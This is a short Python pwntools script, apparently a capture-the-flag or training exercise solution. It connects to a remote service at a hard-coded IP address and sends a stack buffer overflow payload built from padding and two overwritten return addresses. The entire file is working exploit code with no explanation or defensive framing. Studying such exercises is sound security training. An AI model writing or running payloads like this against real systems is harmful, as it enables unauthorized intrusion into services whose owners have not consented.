#!/usr/bin/python

from pwn import *

def main():
    # Start a local process
    #p = process("../build/2_interactive")
    p = remote("128.199.98.78", 1700)

    # Get rid of the prompt
    data1 = p.recvrepeat(0.2)
    log.info("Got data: %s" % data1)

    # Send the password
    payload = "A" * 64 + "\xdf\x86\x04\x08" + "B" * 12 + "\x4b\x85\x04\x08"
    p.sendline(payload)

    # Check for success or failure
    data2 = p.recvline()
    log.info("Got data: %s" % data2)
    
if __name__ == "__main__":
    main()

